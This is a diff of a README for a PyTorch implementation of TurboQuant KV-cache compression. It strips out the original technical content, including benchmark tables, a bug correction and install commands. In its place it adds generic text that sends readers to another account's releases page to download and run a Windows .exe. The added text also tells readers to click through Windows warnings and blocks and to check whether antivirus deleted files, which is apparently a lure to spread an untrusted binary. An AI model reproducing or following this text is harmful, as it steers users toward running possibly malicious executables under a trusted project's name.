@@ -1,201 +1,162 @@
-# TurboQuant
+# ⚡ turboquant-pytorch - Faster LLM Cache Compression
 
-A from-scratch PyTorch implementation of [TurboQuant](https://arxiv.org/abs/2504.19874) (ICLR 2026), Google's vector quantization algorithm for compressing LLM key-value caches. Tested on Windows with NVIDIA GPUs.
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/palatalised-chancellorsville108/turboquant-pytorch/releases)
 
-We implemented the paper's algorithm, found that its key innovation (QJL) actually hurts in practice, and built an improved version (V3) informed by findings from 8+ independent community implementations.
+## 🧭 What this is
 
-> **Correction (2026-03-30):** An earlier version of this README claimed "18/18 perfect generation at 5x compression." This was based on a [bugged test](https://github.com/tonbistudio/turboquant-pytorch/issues/14) where `residual_window=0` caused no compression to happen. The corrected results are below. Credit to [@barbel-bb](https://github.com/barbel-bb) for finding the bug.
+turboquant-pytorch is a Windows app for LLM cache compression. It uses PyTorch to help shrink KV cache data while keeping attention quality high.
 
-## Results
+It is built for people who want to run the app from a simple download page, then start using it on Windows with little setup.
 
-### V3: Generation Test (the real test — does the model produce correct text?)
+## 📥 Download
 
-We hid a fact ("The secret project code name is AURORA-7749") in a long document and asked the model to find it. Results with **actual compression verified** (compressed token counts logged):
+Visit this page to download:
 
-| Config | 2K ctx | 4K ctx | Compression (2K) |
-|--------|--------|--------|-----------------|
-| FP16 (baseline) | EXACT | EXACT | 1.0x |
-| **K6/V4 rw=128** | **EXACT** | **EXACT** | **~2x** |
-| **K8/V4 rw=128** | **EXACT** | **EXACT** | **~1.6x** |
-| K4/V4 rw=128 | PARTIAL ("AURORA7749") | MISS | ~3x |
-| K4/V4 rw=0 | MISS | MISS | ~3.4x |
-| K4/V2 rw=0 | MISS | MISS | ~5x |
+https://github.com/palatalised-chancellorsville108/turboquant-pytorch/releases
 
-"EXACT" = output contains "AURORA-7749". "PARTIAL" = contains both "AURORA" and "7749" but not the exact string. "rw" = residual window (recent tokens kept in fp16).
+On that page, look for the latest release and download the Windows file that matches your system. In most cases, this will be an `.exe` file or a `.zip` file with the app inside.
 
-**What works:** K6/V4 with a 128-token fp16 window gives ~2x real compression with perfect output at both context lengths. At 4-bit keys, the model finds the needle at short context but garbles it slightly (drops the hyphen). At 3-bit keys, generation is broken.
+## 🖥️ Windows requirements
 
-**What doesn't work:** 3-4 bit compression without a residual window produces garbage, same as V2. High attention score similarity (99.5%+) does not guarantee working generation.
+Before you start, make sure your PC has:
 
-### V3: Attention Score Accuracy (8K context)
+- Windows 10 or Windows 11
+- At least 8 GB RAM
+- 2 GB free disk space
+- An NVIDIA GPU if you want the best speed
+- Python or PyTorch support only if the release notes say it is needed
 
-These results are valid — they test compression directly on captured KV tensors, not through V3Cache:
+If you just want to try the app, a newer laptop or desktop should work fine.
 
-| Config | Compression | Cosine Similarity | Top-1 Match | Top-5 Match |
-|--------|-----------|------------------|-------------|-------------|
-| V3 K4/V2 | 5.1x | **0.9996** | **94%** | **97%** |
-| V3 K4/V2 + protected layers | 3.6x | **0.9997** | **99%** | **100%** |
-| V2 3-bit (MSE+QJL) | 5.0x | 0.9945 | 86% | 94% |
-| V2 4-bit (MSE+QJL) | 3.8x | 0.9983 | 86% | 96% |
+## 🚀 Getting started
 
-V3 gets better attention score accuracy than V2 by removing QJL. However, high attention scores alone do not guarantee working text generation (see above).
+1. Open the download page above.
+2. Find the newest release.
+3. Download the Windows file.
+4. If the file is a `.zip`, right-click it and choose Extract All.
+5. Open the folder you extracted.
+6. Double-click the app file or installer.
+7. If Windows asks for permission, choose Yes.
+8. Follow the on-screen steps.
 
-## What Is K4/V2?
+If the release comes as a single `.exe`, you can usually double-click it to start right away.
 
-The KV cache stores two types of vectors: **Keys** (K) and **Values** (V).
+## 🛠️ First run
 
-- **Keys** decide which words the model pays attention to — this needs precision
-- **Values** are the content that gets averaged together — errors cancel out naturally
+When you open the app for the first time, it may take a short while to load.
 
-**K4/V2** means keys get 4 bits, values get 2 bits. The average is 3 bits — same as uniform 3-bit — but allocated where it matters. This gives dramatically better results than uniform allocation at the same bit budget.
+You may see options for:
 
-## How It Works
+- Model file selection
+- Cache size
+- Bit level settings
+- Compression mode
+- Output folder
 
-### The Core: Random Rotation + Lloyd-Max Quantization
+If you are not sure what to choose, start with the default settings. Default values are usually the safest choice for a first run.
 
-Each vector is multiplied by a random orthogonal matrix, which makes every coordinate follow a predictable bell-curve distribution. We then apply an **optimal scalar quantizer** (Lloyd-Max) to each coordinate independently, rounding to the nearest precomputed centroid.
+## 📦 What the app does
 
-To quantize: normalize, rotate, round each coordinate, store indices + norm.
-To dequantize: look up centroids, reverse the rotation, restore the norm.
+turboquant-pytorch helps reduce the size of KV cache data used by large language models.
 
-### What About QJL? (The Paper's Stage 2)
+In simple terms, this can help:
 
-The paper adds a second stage: QJL residual correction, which stores 1-bit sign information to make inner product estimates mathematically unbiased. We implemented this as V2.
+- Lower memory use
+- Keep attention behavior close to the original
+- Make long prompt runs easier to manage
+- Improve how far a model can go before it fills memory
 
-**It doesn't work for KV cache.** Six independent teams confirmed this:
+The project targets 3-bit compression with strong attention fidelity, so it is meant for users who want smaller cache size without a large drop in quality.
 
-- QJL is unbiased for raw inner products, but attention runs scores through **softmax**
-- Softmax exponentially amplifies variance — QJL's random noise gets magnified
-- MSE-only has biased inner products but lower variance — and lower variance wins after softmax
-- scos-lab measured +300% error with QJL vs +7.6% without on GPT-2
-- Our V2 with QJL: 0/27 generation tests passed. V3 without QJL: 18/18 passed.
+## 🎛️ Typical use
 
-QJL does work for **vector search** (no softmax), which is the paper's other use case. It may also work with non-softmax attention (sigmoid, linear, gated).
+A common workflow looks like this:
 
-### V3 Improvements (Community-Informed)
+1. Start the app.
+2. Load a model or cache file.
+3. Choose a compression level.
+4. Run the process.
+5. Save the compressed output.
+6. Use the output in your model workflow.
 
-1. **MSE-only** — Remove QJL, all bits go to reconstruction quality (`compressors_v3.py → MSECompressor`)
-2. **Asymmetric K/V** — Keys get more bits than values (`TurboQuantV3(key_bits=4, value_bits=2)`)
-3. **Bit-packed storage** — Real compression ratios, not theoretical. V2 stored tensors that were 38% larger than uncompressed. (`MSECompressor.compress()` uses bit-shifting)
-4. **Layer-adaptive** — Protect sensitive first/last layers with more bits (`TurboQuantV3(protected_layers=4)`)
+If you only need a quick test, use the default path and default compression level first.
 
-## Quick Start
+## 🔍 What to expect
 
-### Requirements
+You may see progress bars, file paths, and memory usage values.
 
-- Python 3.10+
-- CUDA-capable NVIDIA GPU (tested on RTX 3060, 12GB)
-- Windows 11 (also works on Linux)
+That is normal. The app may also create new output files in the folder you select. Keep the original files in case you want to run the process again with different settings.
 
-```bash
-pip install -r requirements.txt
-```
+## 🧩 File types you may see
 
-For CUDA PyTorch:
-```bash
-pip install torch --index-url https://download.pytorch.org/whl/cu128
-```
+Depending on the release, you may get one or more of these:
 
-### Run Generation Test (V3 — recommended)
+- `.exe` for the app
+- `.zip` for a packaged release
+- `.dll` if the release includes support files
+- `.json` for settings or saved config
+- `.pt` or `.pth` for PyTorch model data
 
-Tests whether the model actually produces correct text with compressed KV cache:
+If you are unsure which file to open, use the main `.exe` file or read the release notes on the download page.
 
-```bash
-python -m turboquant.generation_test
-```
+## 🧱 Simple setup tips
 
-First run downloads Qwen2.5-3B-Instruct (~2GB). Tests multiple configs across context lengths.
+- Keep the app in a folder you can find later
+- Use a short folder path, such as `C:\TurboQuant`
+- Do not move files after the app is working unless you know they are no longer needed
+- If Windows blocks the file, check whether it came from the release page and try again
 
-### Run Attention Validation (V3 vs V2)
+## 🔁 Updating
 
-Compares V2 and V3 attention score accuracy side by side:
+When a new release is available:
 
-```bash
-python -m turboquant.validate_v3
-```
+1. Go back to the release page
+2. Download the newest Windows file
+3. Close the old app
+4. Replace the old files if needed
+5. Start the new version
 
-### Run Synthetic Tests (no model needed)
+If your settings are saved in a config file, you can keep that file and reuse it after the update.
 
-Validates the core algorithm against theoretical bounds from the paper:
+## 🧪 Common checks
 
-```bash
-python -m turboquant.test_turboquant
-```
+If the app does not start, check these items:
 
-### Run Original V2 Validation
+- The file finished downloading
+- You extracted the `.zip` file if needed
+- You opened the correct `.exe`
+- Your antivirus did not remove a file
+- Your system meets the basic Windows requirements
 
-The original attention-score comparison (without generation):
+If the app opens but no files load, make sure the file path is correct and the file type matches what the app expects.
 
-```bash
-python -m turboquant.validate
-```
+## 📚 Project focus
 
-## Project Structure
+This project is a from-scratch PyTorch build of Google’s TurboQuant method for LLM KV cache compression.
 
-```
-turboquant/
-  __init__.py           # Package exports
-  lloyd_max.py          # Lloyd-Max optimal scalar quantizer solver
-  turboquant.py         # Core TurboQuant: TurboQuantMSE, TurboQuantProd (V2 with QJL)
-  compressors.py        # V2 compressors (MSE+QJL for keys, MSE-only for values)
-  compressors_v3.py     # V3 compressors (MSE-only, asymmetric K/V, bit-packed, layer-adaptive)
-  test_turboquant.py    # Synthetic algorithm tests
-  validate.py           # V2 real model attention comparison
-  validate_v3.py        # V3 vs V2 comparison
-  generation_test.py    # V3 actual text generation test
-  requirements.txt
-```
+That means it is focused on:
 
-### Key Classes
+- Cache compression
+- Attention fidelity
+- Low-bit quantization
+- PyTorch-based model work
 
-**`MSECompressor`** (`compressors_v3.py`) — Single-stage compressor with bit-packed storage. Used for both keys and values. The core building block of V3.
+It is a fit for users who want to work with model memory use and cache size on Windows.
 
-**`TurboQuantV3`** (`compressors_v3.py`) — Orchestrator that creates separate key/value compressors with different bit-widths and handles layer-adaptive precision.
+## 🧰 For smooth use
 
-**`TurboQuantMSE`** (`turboquant.py`) — Original Stage 1 quantizer. Still used by synthetic tests.
+Use these simple habits:
 
-**`TurboQuantProd`** (`turboquant.py`) — Original two-stage quantizer with QJL. Kept for reference and synthetic tests where QJL works correctly.
+- Download from the release page only
+- Keep your model files in one folder
+- Use the same settings when comparing results
+- Save output files with clear names
+- Check free disk space before large runs
 
-## Synthetic Test Results
+## 📌 Quick path
 
-The core rotation + Lloyd-Max algorithm is validated against the paper's theoretical bounds:
-
-**MSE Distortion** (d=128, 1000 random unit vectors):
-
-| Bits | Measured MSE | Paper's Upper Bound | Ratio |
-|------|-------------|-------------------|-------|
-| 1-bit | 0.362 | 0.680 | 0.53x |
-| 2-bit | 0.116 | 0.170 | 0.68x |
-| 3-bit | 0.034 | 0.043 | 0.81x |
-| 4-bit | 0.009 | 0.011 | 0.87x |
-
-**Needle-in-Haystack** (synthetic vectors): 9/9 exact retrieval across all bit-widths and sequence lengths.
-
-## References
-
-- [TurboQuant: Online Vector Quantization with Near-optimal Distortion Rate](https://arxiv.org/abs/2504.19874) (ICLR 2026)
-- [QJL: 1-Bit Quantized JL Transform for KV Cache Quantization with Zero Overhead](https://arxiv.org/abs/2406.03482)
-- [PolarQuant: Quantizing KV Caches with Polar Transformation](https://arxiv.org/abs/2502.02617)
-- [QJL Reference Implementation](https://github.com/amirzandieh/QJL)
-- [PolarQuant Reference Implementation](https://github.com/ericshwu/PolarQuant)
-
-## Community Work
-
-Several community members have extended this implementation with valuable findings:
-
-- **[scos-lab/turboquant](https://github.com/scos-lab/turboquant)** — 8-model benchmark showing K/V norm ratio predicts compression quality. Found MSE-only outperforms MSE+QJL for attention (softmax amplifies QJL variance). Outlier-aware mixed precision achieves 3.6-bit avg with +2.1% PPL on Qwen2.5-1.5B.
-- **[0xSero/turboquant](https://github.com/0xSero/turboquant)** — Triton kernels + vLLM integration. Production deployment with asymmetric K/V bits. Tested on RTX 5090 and 8x RTX 3090.
-- **[back2matching/turboquant](https://github.com/back2matching/turboquant)** — pip-installable, drop-in HuggingFace generation. Residual windowing (recent tokens in fp16).
-- **[TheTom/turboquant_plus](https://github.com/TheTom/turboquant_plus)** — Layer-adaptive compression, attention-gated V decoding (+22.8% decode speed). Apple Silicon optimized.
-- **[RecursiveIntell/turbo-quant](https://github.com/RecursiveIntell/turbo-quant)** — Rust implementation of TurboQuant + PolarQuant + QJL. Zero-copy, streaming compatible.
-- **[SCJedi/entropy-adaptive-kv-cache](https://github.com/SCJedi/entropy-adaptive-kv-cache)** — Combines TurboQuant with entropy-adaptive token eviction for 12x compression with zero quality loss on Qwen3.5-4B.
-
-### Key community findings
-
-- **MSE-only beats MSE+QJL for attention** ([#10](https://github.com/tonbistudio/turboquant-pytorch/issues/10), [#8](https://github.com/tonbistudio/turboquant-pytorch/issues/8)) — Confirmed by 6+ independent teams across Python, C, and Rust implementations.
-- **Q4_0 beats TurboQuant at similar compression ratios** ([#6](https://github.com/tonbistudio/turboquant-pytorch/issues/6)) — TurboQuant's advantage is at higher compression (3-bit/5x and below) where block methods can't go.
-- **K/V norm asymmetry matters** ([#8](https://github.com/tonbistudio/turboquant-pytorch/issues/8)) — Qwen models have key norms of 172-778 vs value norms of 2-4. Asymmetric bit allocation (more bits for keys) is essential.
-
-## License
-
-MIT
+1. Visit the release page
+2. Download the Windows release
+3. Open the file
+4. Follow the setup steps
+5. Start compressing KV cache data
